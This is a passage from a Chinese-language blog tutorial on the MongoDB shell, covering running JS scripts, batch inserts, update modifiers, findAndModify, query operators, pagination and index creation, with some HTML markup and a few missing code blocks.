)\"></a>第04节：用js文件写mongo命令(<code>var db = connect(&quot;dbName&quot;)</code> )</h2><p>   命令行写<code>mongo</code>命令（shell）实在麻烦(无法忍受windows系统 命令行),这节学习用<code>JS</code>文件来写<code>shell命令</code>和<code>执行</code>。<code>JS</code>写<code>mongo</code>的<code>Shell</code>命令大部分是相同的,只有小部分不一样。<br>  <strong>把命令写入JS中</strong><br>    现模拟一个用户登录日志表 信息,用JS进行编写。在一个新建目录下,比如D:/mongoShell/,新建一个goTask.js文件。文件内容如下：</p>\n<blockquote>\n<p>goTask.js文件<br>var userName=”jspang”;    //声明一个登录名<br>var timeStamp=Date.parse(new Date());     //声明登录时的时间戳<br>var jsonDdatabase={“loginUnser”:userName,”loginTime”:timeStamp}; //组成JSON字符串<br>var db = connect(‘log’);   //链接数据库<br>db.login.insert(jsonDdatabase);  //插入数据</p>\n<p>print(‘[demo]log  print success’);  //没有错误显示成功<br>var userName=”jspang”;    //声明一个登录名<br>var timeStamp=Date.parse(new Date());     //声明登录时的时间戳<br>var jsonDdatabase={“loginUnser”:userName,”loginTime”:timeStamp}; //组成JSON字符串<br>var db = connect(‘log’);   //链接数据库<br>db.login.insert(jsonDdatabase);  //插入数据</p>\n<p>print(‘[demo]log  print success’);  //没有错误显示成功</p>\n</blockquote>\n<p>  <strong>执行JS文件</strong></p>\n<blockquote>\n<p>mongo goTask.js</p>\n</blockquote>\n<p>  总结：这节很好的解决 在终端写 命令行 的难题,虽然大部分Shell和在命令行中写法一样,但是也稍有不同,希望小伙伴们可以轻松掌握。 </p>\n<h2 id=\"第05节：批量插入的正确方法-“批量数据插入-以数组方式”-老版本MongoDB-batchInsert-一次插入不要超-48M-静态存储-批量插入性能测试-批量-gt-循环-数据库性能\"><a href=\"#第05节：批量插入的正确方法-“批量数据插入-以数组方式”-老版本MongoDB-batchInsert-一次插入不要超-48M-静态存储-批量插入性能测试-批量-gt-循环-数据库性能\" class=\"headerlink\" title=\"第05节：批量插入的正确方法(“批量数据插入 以数组方式” 老版本MongoDB batchInsert 一次插入不要超 48M 静态存储 批量插入性能测试 批量&gt;循环 数据库性能)\"></a>第05节：批量插入的正确方法(“批量数据插入 以<code>数组</code>方式” <code>老版本MongoDB batchInsert</code> <code>一次插入不要超 48M</code> <code>静态存储</code> <code>批量插入性能测试 批量&gt;循环</code> <code>数据库性能</code>)</h2><p>   在操作数据库时要注意两个能力：<br>    第一个是<code>快速存储能力</code>。<br>    第二个是<code>方便迅速查询能力</code>。</p>\n<p>   <strong>批量插入</strong><br>    批量数据插入是以<strong>数组</strong>的方式进行的（如果写错,可以3个回车可以切出来）。我们现在命令行中敲入下面的代码,我们可以看到数据顺利插入了。<br>    老版本MongoDB（3.2以前的版本基本都需要）是需要在<code>Insert</code>前加一个<code>batch</code>单词的,如下代码。<br>    <code>db.test.batchInsert()</code><br>    <strong>注意</strong>一次插入不要超过48M,<code>.zip</code>和<code>大图片</code>之类尽量用<code>静态存储</code>,MongoDB存储<code>静态路径</code>就好,这也算是一个规则。</p>\n<p>   <strong>批量插入性能测试</strong><br>    刚学了批量插入,那是循环插入快？还是批量插入快那？在一般人的认知里肯定是批量插入更快（其实这毋庸置疑）,但我们要拿出极客精神,探个究竟,试着写一个小Shell,来验证一下结果。<br>    先写一个<code>循环插入</code>方法：</p>\n<pre><code>`批量插入`代码:\n</code></pre><p>   <strong>总结</strong>：在工作中<code>一定</code>要<code>照顾数据库性能</code>,这也是你<code>水平的体现</code>,一个技术会了很简单,但是要精通不那么简单。学完这节,记得在工作中如果在循环插入和批量插入举棋不定,那就选批量插入吧,它会给我们更优的性能体验。 </p>\n<h2 id=\"第06节：修改：Update常见错误-只update修改项\"><a href=\"#第06节：修改：Update常见错误-只update修改项\" class=\"headerlink\" title=\"第06节：修改：Update常见错误(只update修改项)\"></a>第06节：修改：Update常见错误(<code>只update修改项</code>)</h2><p>   这节开始说一说<code>Update</code> 详细操作,先来看下常见错误,知道 困难 或者说 问题在哪里,再提出解决方案。这节会先演示一些错误的 <code>Update</code> 方法,然后再说正确的方法。希望不要误导小伙伴。<br>   <strong>错误：只update修改项</strong><br>    <code>Update</code>的使用方法需要注意<br>    db.xxxset.update({“”:””},<code>{&quot;&quot;:&quot;&quot;} || [] || variable</code>)(此方法属于整条数据修改,替换项需要整条数据)</p>\n<p>   <strong>正确修改方法</strong><br>    可以声明一个变量,然后把要改变数据的全部信息放入变量,最后执行修改操作。</p>\n<p>   现在这种方法才是正确的,数据修改正常了,但是你会发现写起来非常麻烦,而且特别容易写错。下节我们会介绍<code>update修改器</code>,可以很好的解决这个问题。 </p>\n<h2 id=\"第07节：修改：初识update修改器-set-set嵌套内容-unset-inc-multi-upsert\"><a href=\"#第07节：修改：初识update修改器-set-set嵌套内容-unset-inc-multi-upsert\" class=\"headerlink\" title=\"第07节：修改：初识update修改器($set/$set嵌套内容 $unset $inc multi upsert)\"></a>第07节：修改：初识update修改器(<code>$set/$set嵌套内容</code> <code>$unset</code> <code>$inc</code> <code>multi</code> <code>upsert</code>)</h2><p>   上节的<code>修改</code>用起来实在是<code>不够优雅</code>,这是我们一个伟大的前端不能接受的,所以我们要学习<code>update修改器</code>,来解决这个问题。<code>update修改器</code>可以帮助我们<code>快速</code>和<code>简单</code>的修改数据,让我们的操作更简单方便。<br>  <strong>$set修改器</strong><br>    用来修改一个指定的键值(key),这时候我们要修改上节的sex和age就非常方便了,只要一句话就可以搞定。</p>\n<blockquote>\n<p>db.workmate.update({“name”:”MinJie”},{“$set”:{sex:2,age:21}})<br>    修改好后,我们可以用db.workmate.find()来进行查看,你会发现数据已经被修改。<br>   <strong>修改嵌套内容(内嵌文档)</strong><br>db.workmate.update({“name”:”MinJie”},{“$set”:{“skill.skillThree”:’word’}})</p>\n</blockquote>\n<p>  <strong>$unset用于将key删除</strong></p>\n<blockquote>\n<p>db.workmate.update({“name”:”MinJie”},{$unset:{“age”:’’}})</p>\n</blockquote>\n<p>  <strong>$inc对数字进行计算</strong><br>   它是对<code>value值</code>的修改,但是修改的<code>必须是数字</code>,<code>字符串</code>是<code>不起效果</code>的。</p>\n<blockquote>\n<p>db.workmate.update({“name”:”MinJie”},{$inc:{“age”:-2}})</p>\n</blockquote>\n<p>  <strong>multi选项</strong><br>   <code>multi</code>是有<code>ture</code>和<code>false</code>两个值,<code>true代表全部修改</code>,<code>false代表只修改一个(默认值)</code>。</p>\n<p>  <strong>upsert选项</strong><br>   <code>upsert</code>也有<code>ture</code>和<code>false</code>两个值：<code>true代表没有就添加</code>,<code>false代表没有不添加(默认值)</code>。</p>\n<p>  <strong>总结</strong>：这节的内容非常多,主要学习了<code>update修改器</code>有关的一些东西。一定要多练习几遍,否则很快就会忘记的。</p>\n<h2 id=\"第08节：修改：update数组修改器-push-ne-addToSet-each-pop\"><a href=\"#第08节：修改：update数组修改器-push-ne-addToSet-each-pop\" class=\"headerlink\" title=\"第08节：修改：update数组修改器($push $ne $addToSet $each $pop)\"></a>第08节：修改：update<code>数组</code>修改器(<code>$push</code> <code>$ne</code> <code>$addToSet</code> <code>$each</code> <code>$pop</code>)</h2><p>  已学会一些<code>基础修改器</code>,这节主要学习<code>数组修改器的操作</code>,也可<code>修改内嵌文档</code>,也就是<code>对象形式的数据</code>。<br>  <strong>$push追加数组/内嵌文档值</strong><br>   <code>$push</code>的功能是<code>追加数组中的值</code>,但我们也经常用它操作<code>内嵌文档</code>,就是{}对象型的值。<br>    先看一个追加数组值的方式,比如我们要给小王加上一个爱好(interset)为画画（draw）：</p>\n<blockquote>\n<p>db.workmate.update({name:’xiaoWang’},{$push:{interest:’draw’}})<br>   当然<code>$push</code>修饰符还可以为<code>内嵌文档增加值</code>.<br>    比如我们现在要给我们的UI,增加一项新的技能skillFour为draw,这时候我们可以操作为：<br>db.workmate.update({name:’MinJie’},{$push:{“skill.skillFour”:’draw’}})<br>   <code>$push修饰符</code>在工作中是最常用的,因为 <code>数据</code>一般都会涉及<code>数组</code>和<code>内嵌文档</code>的操作,一定要掌握。</p>\n</blockquote>\n<p>  <strong>$ne查找是否存在</strong>(类似 <code>if(xxx === undefined || !xxx)/else</code> 判断)<br>    它主要的作用是,<code>检查一个值是否存在</code>,如<code>不存在</code>再 执行操作,<code>存在</code>就不执行,这个很<code>容易弄反</code>,记得我刚学的时候就经常弄反这个修改器的作用,给自己增加了很多坑。</p>\n<blockquote>\n<p>db.workmate.update({name:’xiaoWang’,”interest”:{$ne:’playGame’}},{$push:{interest:’Game’}})<br>   <strong>总结</strong>：没有则修改,有则不修改。</p>\n</blockquote>\n<p>  <strong>$addToSet 升级版的$ne</strong><br>    它是$ne的升级版本（查找是否存在,不存在就push上去）,操作起来更直观和方便,所以再工作中这个要比$en用的多。</p>\n<blockquote>\n<p>db.workmate.update({name:”xiaoWang”},{$addToSet:{interest:”readBook”}})</p>\n</blockquote>\n<p>  <strong>$each 批量追加</strong><br>    它可以传入一个<code>数组</code>,一次增加<code>多个值</code>进去,相当于<code>批量操作</code>,性能同样比循环操作要好很多,这个是需要我们注意的,工作中也要先组合成数组,然后用批量的形式进行操作。</p>\n<blockquote>\n<p>var newInterset=[“Sing”,”Dance”,”Code”];<br>db.workmate.update({name:”xiaoWang”},{$addToSet:{interest:{$each:newInterset}}})</p>\n</blockquote>\n<p>  <strong>$pop 删除数组值</strong><br>    <code>$pop</code>只删除一次,并不是删除所有数组中的值。而且它有<code>两个选项</code>,<code>1</code>和<code>-1</code>。<br>    1：从数组末端进行删除<br>    -1：从数组开端进行删除</p>\n<blockquote>\n<p>db.workmate.update({name:’xiaoWang’},{$pop:{interest:1}})</p>\n</blockquote>\n<p>  <strong>数组定位修改</strong><br>    有时候只知道修改数组的第几位,但并不知道是什么,这时候我们可以使用<code>interest.int</code>的形式。<br>    <code>例子</code> 比如我们现在要修改xiaoWang的第三个兴趣为编码（Code）,注意这里的计数是从0开始的。</p>\n<blockquote>\n<p>db.workmate.update({name:’xiaoWang’},{$set:{“interest.2”:”Code”}})</p>\n</blockquote>\n<p>  <strong>总结</strong>：这节主讲<code>数组</code>和<code>内嵌文档</code>有关的<code>update</code>修改器,内容很多,都需要不断熟练记忆。当然如果你记不住,你至少记住这个博客网址,因为技术胖把笔记已经给你整理好了。</p>\n<h2 id=\"第09节：修改：状态返回与安全-应答式-非应答式-db-runCommand-findAndModify\"><a href=\"#第09节：修改：状态返回与安全-应答式-非应答式-db-runCommand-findAndModify\" class=\"headerlink\" title=\"第09节：修改：状态返回与安全(应答式/非应答式 db.runCommand() findAndModify())\"></a>第09节：修改：状态返回与安全(<code>应答式/非应答式</code> <code>db.runCommand()</code> <code>findAndModify()</code>)</h2><p>  在操作数据库时,对<code>数据的修改</code>需要<code>足够的安全措施</code>,实际工作中,用<code>db.collections.update</code>不多,修改时都用<code>findAndModify</code>,它<code>返回</code>来一些必要的<code>参数</code>,让我们对<code>修改</code>多了很多<code>控制</code>力,<code>控制力的加强</code>也就是对<code>安全的强化能力加强</code>。</p>\n<p>  <strong>应答式写入</strong><br>   先了解一个概念：<code>应答式写入</code>。在<code>以前</code>的文章中,我们的操作都是<code>非应答式写入</code>,就是在<code>操作完</code>数据库后,它并没有给我们任何的<code>回应</code>和<code>返回值</code>,而是我们自己安慰自己写了一句话（print(‘[update]:The data was updated successfully’);）。这在<code>工作中 不允许</code>,因为根本<code>不能提现</code>我们<code>修改的结果</code>。<br>   <strong>应答式</strong>写入就会给我们<code>直接返回结果</code>(报表),结果里边的包含项会很多,这样我们就可以很好的进行程序的控制和安全机制的处理。有点像<code>前端</code>调用<code>后端接口</code>,无论作什么,后端都要给我一些<code>状态字节</code>一样。</p>\n<p>  <strong>db.runCommand()</strong><br>   是数据库运行命令的<code>执行器</code>,执行命令<code>首选</code>就要使用它,因为它在<code>Shell</code>和<code>驱动程序</code>间提供了一致的接口。（几乎操作数据库的所有操作,都可以使用<code>runCommand</code>来执行）现在我们试着用<code>runCommand</code>来修改数据库,看看结果和直接用<code>db.collections.update</code>有什么<code>不同</code>。</p>\n<blockquote>\n<p>db.workmate.update({sex:1},{$set:{money:1000}},false,true)<br>var resultMessage=db.runCommand({getLastError:1})<br>printjson(resultMessage);</p>\n</blockquote>\n<p>   上边代码 修改所有男士 每人增加1000元钱(money),然后用<code>db.runCommand()</code>执行,可看到执行结果在控制台返回。<br>    {<br>      “connectionId” : 1,<br>      “updatedExisting” : true,<br>      “n” : 2,<br>      “syncMillis” : 0,<br>      “writtenTo” : null,<br>      “err” : null,<br>      “ok” : 1<br>    }<br>    <code>false</code>：第一句末尾的false是upsert的简写,代表没有此条数据时不增加;<br>    <code>true</code>：true是multi的简写,代表修改所有,这两个前边已学过。<br>    <code>getLastError:1</code> :表示返回功能错误,这里的参数很多,如果有兴趣请自行查找学习,这里不作过多介绍。<br>    <code>printjson</code>：表示以json对象的格式输出到控制台。<br>    <code>db.listCommands( )</code>:查看所有的Commad命令, 内容很多, 本课程只讲解<code>工作中经常使用</code>的内容。</p>\n<p>   比如我们要查看是否和数据库链接成功了,就可以使用Command命令。<br>   <code>db.runCommand({ping:1})</code><br>   返回<code>ok:1</code>就代表链接正常。</p>\n<p>  <strong>findAndModify</strong><br>   从名字看,<code>findAndModify</code>是<code>查找并修改</code>的意思。配置它可以在修改后给我们返回修改的结果。看下面代码：</p>\n<blockquote>\n<p>var myModify={<br> findAndModify:”workmate”,<br> query:{name:’JSPang’},<br> update:{$set:{age:18}},<br> new:true    //更新完成,需要查看结果,如果为false不进行查看结果<br>}<br>var ResultMessage=db.runCommand(myModify);</p>\n<p>printjson(ResultMessage)<br>   <code>findAndModify</code>的<code>性能</code>是不如<code>db.collections.update</code>的性能好,但实际工作中都使用它,毕竟要<code>商用程序</code>安全性还是比较重要的。<br>   <code>findAndModify属性值</code>:<br>    <code>query</code>:需要查询的条件/文档<br>    <code>sort</code>: 排序<br>    <code>remove</code>:[boolean]是否删除查找到的文档,值填写true,可以删除。<br>    <code>new</code>:[boolean]返回更新前的文档还是更新后的文档。<br>    <code>fields</code>:需要返回的字段<br>    <code>upsert</code>:没有这个值是否增加。<br>   <strong>总结</strong>：这节讲了一些跟<code>安全有关的操作</code>,但这<code>不是全部</code>,我们随着课程的深入还会继续学习更多的知识。工作中尽量使用<code>findAndModify</code>来进行更新数据,这样会更安全和直观,这点性能的损失是值得的。</p>\n</blockquote>\n<h2 id=\"第10节：查询：find的不等修饰符-简单查找-quot-x-x-quot-转字符串-筛选字段-第二对象参数-boolean-0-1-不等修饰符\"><a href=\"#第10节：查询：find的不等修饰符-简单查找-quot-x-x-quot-转字符串-筛选字段-第二对象参数-boolean-0-1-不等修饰符\" class=\"headerlink\" title=\"第10节：查询：find的不等修饰符(简单查找(&quot;x.x&quot;)转字符串 筛选字段(第二对象参数 boolean || 0/1) 不等修饰符)\"></a>第10节：查询：find的不等修饰符(<code>简单查找(&quot;x.x&quot;)转字符串</code> <code>筛选字段(第二对象参数 boolean || 0/1)</code> <code>不等修饰符</code>)</h2><p>  <code>MongoDB</code>的<code>查找操作</code> 分几节课来讲,因为内容比较多, <code>开发中</code> 查找 是应用最多的操作,几乎每个模块都会用到,所以<code>查找部分</code>将是本套课的<code>重中之重</code>。这节课我们先来看看简单的查询条件,也了解一下find基础用法。<br>  如果你以前操作过<code>关系型数据库</code>比如<code>MySql</code> 你会对&gt;(大于),&lt;(小于),=(等于)这些东西很熟悉,但是<code>非关系型数据库</code>不能直接使用这些符号,稍有区别。<br>  <strong>构造数据</strong><br>   我们需要构造更多的数据到集合中,这样我们才能很好的讲解查询条件,下面代码你可以直接复制进行添加。当然你也可以自己随意加一些数据到集合中,只要方便我们学习就可以了。<br>   “D:\\工具\\工作学习\\monggoShell\\demo10.js”</p>\n<p>  <strong>简单查找</strong><br>   比如 现在要查找数据中 技能一 会HTML+CSS 的所有人。直接进行查找加条件就可以。</p>\n<blockquote>\n<p>db.workmate.find({“skill.skillOne”:”HTML+CSS”})<br>   这时不能使用load来载入,以后会给大家讲使用方法,先用比较笨的方法,使用粘贴复制的方法 在命令行执行。</p>\n</blockquote>\n<p>  <strong>筛选字段</strong><br>   <code>返回数据项</code>太多,太乱,有时 程序并不需要 这么多选项。比如 只需要<code>姓名</code>和<code>技能</code>就可以了。这时候需要写第二个参数,看以下代码。<br>   db.workmate.find(<br>      {“skill.skillOne”:”HTML+CSS”},<br>      {name:true,”skill.skillOne”:true}<br>   )<br>   终端中看到如下结果：<br>    略……<br>   细心的小伙伴会发现还不够完美,多了一个<code>ID字段</code>,这个也不是我们想要的,这时候只要把<code>_id:false</code>就可以了。当然这里的<code>false</code>和<code>true</code>,<strong>也可以用<code>0</code>和<code>1</code>表示。</strong><br>   db.workmate.find(<br>     {“skill.skillOne”:”HTML+CSS”},<br>     {name:1,”skill.skillOne”:1,_id:0}<br>   )<br>   <strong>不过</strong>这些查找操作,都是在作<code>等于</code>的阶段,但是不光只有等于查询,我们需要更多的查询条件。</p>\n<p>  <strong>不等修饰符</strong></p>\n<ul>\n<li>小于($lt):英文全称<code>less-than</code></li>\n<li>小于等于($lte)：英文全称<code>less-than-equal</code></li>\n<li>大于($gt):英文全称<code>greater-than</code></li>\n<li>大于等于($gte):英文全称<code>greater-than-equal</code></li>\n<li><p>不等于($ne):英文全称<code>not-equal</code><br>现在要查找,公司内年龄<code>小于30</code>&amp;<code>大于25岁</code>的人员。看下面的代码。<br>db.workmate.find(<br>{age:{$lte:30,$gte:25}},<br>{name:true,age:true,”skill.skillOne”:true,_id:false}<br>)</p>\n<p><strong>日期查找</strong><br>MongoDB也提供了方便的日期查找方法,现在我们要查找注册日期大于2018年1月10日的数据,我们可以这样写代码。<br>“D:\\工具\\工作学习\\monggoShell\\batch10.js”<br>先声明一个日期变量,然后使用<code>大于符</code>($gt)进行筛选。</p>\n<p><strong>总结</strong>：这节课内容并不多,但如果你是个<code>DBA</code>(数据库管理员) 查找命令工作中每天都会用到,所以这节课的内容练习是必须的,如果你懒得动手,那接下来的课程你可能无法学会。</p>\n</li>\n</ul>\n<h2 id=\"第11节：查询：find的多条件查询-in-nin-有-无-or-and-not-或-与-非\"><a href=\"#第11节：查询：find的多条件查询-in-nin-有-无-or-and-not-或-与-非\" class=\"headerlink\" title=\"第11节：查询：find的多条件查询($in/$nin(有/无) $or / $and / $not(或/与/非))\"></a>第11节：查询：find的多条件查询(<code>$in/$nin</code>(有/无) <code>$or / $and / $not</code>(或/与/非))</h2><p>  很多时候我们需要查询的值<code>不只是有一个简单的条件</code>,比如我们现在要查询一下同事中是<code>33岁</code>和<code>25岁</code>的,还比如我们要查询同事中<code>大于30岁</code>并且<code>会PHP技能</code>的。MongoDB在这方面也支持的很好,我们来学习一下。</p>\n<p>  <strong>$in修饰符</strong><br>   <code>in修饰符</code>可以轻松解决<code>一键多值</code>的查询情况。<br>   就如上面我们讲的例子,现在要查询同事中年龄是25岁和33岁的信息。</p>\n<blockquote>\n<p>db.workmate.find(<br>  {age:{$in:[25,33]}},<br>  {name:1,”skill.skillOne”:1,age:1,_id:0}<br>)<br>   <code>$in</code>相对的修饰符是<code>$nin</code>,就是查询<code>除了$in条件</code>以外的值,小伙伴们可以自己进行练习一下,这里我就不作过多的演示了。</p>\n</blockquote>\n<p>  <strong>$or修饰符</strong><br>   <code>$or修饰符</code>用来查询<code>多个键值</code>的情况,比如查询同事中大于30岁或者会做PHP的信息。<br>   <code>$or修饰符</code>与<code>$in/$nin</code>主要区别 <code>$or</code>修饰符是两个Key值 <code>$in/$nin</code>修饰符是一个Key值 需比较记忆。</p>\n<p>  <strong>总结</strong>：这节知识比较简单,但要<code>区分记忆</code>,很<code>容易搞混</code>。幸运的是这里已经为你准备好学习笔记。当你忘记的时候过来看看吧。</p>\n<h2 id=\"第12节：查询：find的数组查询-all-in-size-slice-显示选项\"><a href=\"#第12节：查询：find的数组查询-all-in-size-slice-显示选项\" class=\"headerlink\" title=\"第12节：查询：find的数组查询($all $in $size $slice(显示选项))\"></a>第12节：查询：find的数组查询(<code>$all</code> <code>$in</code> <code>$size</code> <code>$slice(显示选项)</code>)</h2><p>  这节主要学习数组的查询,在学习update时就花了重墨去讲数组的操作,可见数组的操作在MongoDB中很受重视,因为稍微大型一点的项目,设计的数据集合都复杂一些,都会涉及数组的操作。</p>\n<p>  <strong>完善数据</strong><br>   以前我们的<code>workmate集合</code>对数组涉及还很少,现在在数据中加入了<code>兴趣（interest）</code>,并且给每个人加入了一些兴趣,比如有写代码,做饭,看电影…<br>   当然这些数据你可以自己随意构建,但是如果你不想自己费事费脑,这里也为你准备好了数据,你只要把以前的表删除（drop）掉,重新载入(load)就可以了。</p>\n<p>  <strong>基本数组查询</strong><br>   比如现在我们知道了一个人的爱好是’画画’,’聚会’,’看电影’,但我们不知道是谁,这时候我们就可以使用最简单的数组查询（实际工作中,这种情况基本不常用,所以这种查询只作知识点储备就可以了）。</p>\n<p>   在终端中运行后,我们得到了数据。这时候我们说,想查出看兴趣中有看电影的员工信息。按照正常逻辑,应该使用下面的代码。</p>\n<p>  <strong>$all-数组<code>多项</code>查询(类似 &amp;&amp;)</strong><br>   现在我们的条件升级了,要查询出既喜欢<code>看电影</code>又<code>看书</code>的人员信息,也就是对数组中的对象进行查询,这时候要用到一个新的查询修饰符$all。看下面的例子：</p>\n<p>  <strong>$in-数组的<code>或者</code>查询</strong><br>   <code>$all</code>修饰符,需要<code>满足所有条件</code>; <code>$in</code>主要<code>满足数组中任意的一项</code>就可以被查出来(有时候会跟<code>$or</code>弄混)。比如现在要查询爱好中有看电影的或者看书的员工信息。</p>\n<p>  <strong>$size-数组<code>个数</code>查询</strong></p>\n<p>  <strong>$slice-<code>显示选项</code></strong><br>    展示数据时的判断条件,显示前几项或后几项。<br>    db.workmate.find(<br>      {},<br>      {name:1,interest:{$slice:2},age:1,_id:0}<br>    )</p>\n<p>  <strong>总结</strong>：如果你只看视频一定学不会,程序这东西必须要动手练习,我在所有的视频中都反复强调,目的没有别的就是想让你们真的学会,并应用到工作中去。</p>\n<h2 id=\"第13节：查询：find的参数使用方法-find参数-query-fields-limit-skip-sort-分页Demo-where\"><a href=\"#第13节：查询：find的参数使用方法-find参数-query-fields-limit-skip-sort-分页Demo-where\" class=\"headerlink\" title=\"第13节：查询：find的参数使用方法(find参数[query,fields,limit,skip,sort] 分页Demo $where)\"></a>第13节：查询：find的参数使用方法(<code>find参数[query,fields,limit,skip,sort]</code> <code>分页Demo</code> <code>$where</code>)</h2><p>  前边已讲3节查询,都是在操作<code>find</code>方法的<code>第一个参数(query)</code>和<code>第二个参数(fields)</code>。<code>find</code>还有几个常用的参数,这些参数多用在<code>分页</code>和<code>排序</code>上。这节我们就把这些常用的选项说一说,理解后我们演示一个分页的效果。</p>\n<p>  <strong>find参数</strong><br>    <code>query</code>：这个就是查询条件,<code>MongoDB默认</code>的第一个参数。<br>    <code>fields</code>：（返回内容）查询出来后显示的结果样式,可以用<code>true(1)</code>和<code>false(0)</code>控制是否显示。<br>    <code>limit</code>：返回的数量,后边跟<code>数字(number)</code>,控制<code>每次查询返回</code>的结果数量。<br>    <code>skip</code>:跳过多少个显示,和<code>limit</code>结合可以实现分页。(number)<br>    <code>sort</code>：排序方式,从小到大排序使用<code>1</code>,从大到小排序使用<code>-1</code>。</p>\n<p>  <strong>分页Demo</strong></p>\n<blockquote>\n<p>db.workmate.find({},{name:true,age:true,_id:false}).limit(0).skip(2).sort({age:1});</p>\n</blockquote>\n<p>  <strong>$where修饰符</strong><br>   db.workmate.find(<br>     {$where:”this.age&gt;30”},<br>     {name:true,age:true,_id:false}<br>   )<br>   这里的<code>this</code>指向的是<code>workmate(查询集合)</code>本身。这样我们就可以在程序中随意调用。虽然强大和灵活,但是这种查询对于<code>数据库压力</code>和<code>安全性</code>都会变重,所以在工作中<code>尽量减少</code>$where修饰符的使用。</p>\n<h2 id=\"第14节：查询：find如何在js文本中使用-hasNext-forEach-基础部分完结\"><a href=\"#第14节：查询：find如何在js文本中使用-hasNext-forEach-基础部分完结\" class=\"headerlink\" title=\"第14节：查询：find如何在js文本中使用(hasNext forEach)[基础部分完结]\"></a>第14节：查询：find如何在js文本中使用(<code>hasNext</code> <code>forEach</code>)[基础部分完结]</h2><p>  前边使用<code>find</code>都是<code>JS</code>在文本中写完,然后复制到终端中执行,这样非常麻烦。在讲的过程中已经有很多小伙伴在问我如何像写<code>update</code>语句一样,在文本中直接运行。这节课我们就学习一下如何直接在文本中执行。</p>\n<p>  <strong>hasNext循环结果</strong><br>   想在文本中执行我们的<code>find</code>语句要用到<code>游标</code>和<code>循环</code>的操作,先看一下代码,代码中我已经对每一句进行了注释。</p>\n<blockquote>\n<p>var db = connect(“company”)  //进行链接对应的集合collections<br>var result = db.workmate.find() //声明变量result,并把查询结果赋值给result<br>//利用游标的hasNext()进行循环输出结果。<br>while(result.hasNext()){<br>    printjson(result.next())  //用json格式打印结果<br>}<br>   写完后,现在你只需要在终端中进行<code>load()</code>就可以执行了,再也不用麻烦的复制粘贴了。</p>\n</blockquote>\n<p>  <strong>forEach循环</strong><br>   利用<code>hasNext循环</code>结果,需要借助<code>while</code>的帮助,MongoDB也为我们提供了<code>forEach循环</code>,现在修改上边的代码,使用forEach循环来输出结果。</p>\n<blockquote>\n<p>var db = connect(“company”)  //进行链接对应的集合collections<br>var result = db.workmate.find() //声明变量result,并把查询结果赋值给result<br>//利用游标的hasNext()进行循环输出结果。<br>result.forEach(function(result){<br>    printjson(result)<br>})<br>   <code>作者</code>觉的<code>forEach循环</code>更为<code>优雅</code>。这两种方法都是非常不错的,凭借自己爱好进行选择吧。</p>\n</blockquote>\n<p>  <strong>总结</strong>：那我们MongoDB的<code>基础部分</code>就全部讲完了,我们学会了它的<code>增、删、改、查</code>,你也可以使用MongoDB进行一些操作了。需要注意的是,只是这篇文章的完结,下篇文章我们进行讲解MongoDB,开始讲解MongoDB的<code>索引</code>。</p>\n<h2 id=\"第15节：索引-构造百万级数据-db-randomInfo-stats\"><a href=\"#第15节：索引-构造百万级数据-db-randomInfo-stats\" class=\"headerlink\" title=\"第15节：索引:构造百万级数据(db.randomInfo.stats())\"></a>第15节：索引:构造百万级数据(<code>db.randomInfo.stats()</code>)</h2><p>  索引的<code>性能</code>体现必须要有<code>大量数据</code>才能看出来,你说你有10条20条数据,这是根本看不出来效果的,这节课就通过随机数的方法,创造出一个百万级数据的数据库出来。(随机插入数据,见mongoshell demo15.js)<br>  <strong>PS</strong>:<code>索引</code>是什么？把数据当成一个字典,<code>索引</code>即<code>目录</code>。消耗<code>内存</code>和<code>硬盘</code>。</p>\n<p>  <strong>制作随机数方法</strong></p>\n<p>  <strong>制作随机用户名</strong></p>\n<p>  插入完成后,我们可以使用<code>db.randomInfo.stats()</code>命令查看数据中的数据条数。</p>\n<p>  <strong>总结</strong>:这节课主要是为讲解MongoDB的<code>索引</code>作准备,我们用<code>随机数</code>的方法构建了一个<code>百万级</code>的数据表,如果你有兴趣继续往下学习 练习,这节课必须动手做一下。以后这篇文章的学习全是基于这个代码。</p>\n<h2 id=\"第16节：索引：索引入门-ensureIndex-getIndexes\"><a href=\"#第16节：索引：索引入门-ensureIndex-getIndexes\" class=\"headerlink\" title=\"第16节：索引：索引入门(ensureIndex getIndexes)\"></a>第16节：索引：索引入门(<code>ensureIndex</code> <code>getIndexes</code>)</h2><p>  集合中已建立 200万条数据,可以进行<code>索引</code>的操作了。我们先来建立一个索引,然后看看它的<code>查询性能</code>到底提升了多少倍。这节课的内容不会很难,主要掌握<code>索引的建立方法</code>即可。</p>\n<h3 id=\"建立索引\"><a href=\"#建立索引\" class=\"headerlink\" title=\"建立索引\"></a>建立索引</h3><pre><code>db.randomInfo.ensureIndex({username:1})\n</code></pre><h3 id=\"查看现有索引\"><a href=\"#查看现有索引\" class=\"headerlink\" title=\"查看现有索引\"></a>查看现有索引</h3><pre><code>db.randomInfo.getIndexes()   \n</code></pre><h2 id=\"第17节：索引：复合索引-复合索引的坑-ensureIndex-hint\"><a href=\"#第17节：索引：复合索引-复合索引的坑-ensureIndex-hint\" class=\"headerlink\" title=\"第17节：索引：复合索引(复合索引的坑 ensureIndex hint)\"></a>第17节：索引：复合索引(<code>复合索引的坑</code> <code>ensureIndex</code> <code>hint</code>)</h2><p>什么样的数据使用索引会变慢？<br><code>复合索引</code>的<code>使用</code>和<code>语法</code><br>通过这节 需要对<code>索引</code>使用的<code>时机</code>有所了解，避免画蛇添足，产生不必的麻烦。</p>\n<h3 id=\"索引中的小坑\"><a href=\"#索引中的小坑\" class=\"headerlink\" title=\"索引中的小坑\"></a>索引中的小坑</h3><ul>\n<li>数据<code>不超万条</code>时，不需要使用索引。性能的提升并不明显，大大<code>增加了内存、硬盘 消耗</code>。</li>\n<li>查询数据<code>超过表数据量30%</code>时，不要使用索引字段查询。实际证明会<code>比不使用索引更慢</code>，因为它<code>大量检索</code>了<code>索引表</code>和我们<code>原表</code>。</li>\n<li><code>数字索引</code>，要<code>比字符串索引快</code>的多，在百万级甚至千万级数据量面前，使用数字索引是个明确的选择。</li>\n<li>把你经常查询的数据做成一个<code>内嵌数据</code>（对象型的数据），然后集体进行索引。</li>\n</ul>\n<h3 id=\"复合索引-ensureIndex\"><a href=\"#复合索引-ensureIndex\" class=\"headerlink\" title=\"复合索引(ensureIndex)\"></a>复合索引(<code>ensureIndex</code>)</h3><p><strong>复合索引就是两条以上的索引。</strong>上节课我们已经把<code>username</code>字段建立了索引，我们现在把<code>randNum0</code>，这个字段也设置成索引。<br>    db.randomInfo.ensureIndex({randNum0:1})</p>\n<p>建立好后，再用<code>查询索引状态</code>命令进行查询。<br>    db.randomInfo.getIndexes()</p>\n<h3 id=\"两个索引同时查询\"><a href=\"#两个索引同时查询\" class=\"headerlink\" 